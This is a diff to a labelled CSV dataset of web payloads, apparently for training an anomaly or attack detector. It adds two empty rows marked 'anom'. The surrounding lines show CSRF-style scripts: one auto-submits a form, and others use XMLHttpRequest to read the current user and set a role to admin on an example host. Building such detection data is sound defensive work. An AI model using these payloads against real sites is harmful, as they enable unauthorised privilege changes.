@@ -12,6 +12,7 @@ payload,label
 <script>
  document.getElementById(""autosubmit"").submit();
 </script>",anom
+,anom
 "<script>
 var xhr = new XMLHttpRequest();
 xhr.open(""GET"", ""http://www.example.com/api/currentuser"");
@@ -27,6 +28,7 @@ xhr.setRequestHeader(""Content-Type"", ""text/plain"");
 //xhr.setRequestHeader(""Content-Type"", ""multipart/form-data"");
 xhr.send('{""role"":admin}');
 </script>",anom
+,anom
 "<script>
 var xhr = new XMLHttpRequest();
 xhr.open(""POST"", ""http://www.example.com/api/setrole"");
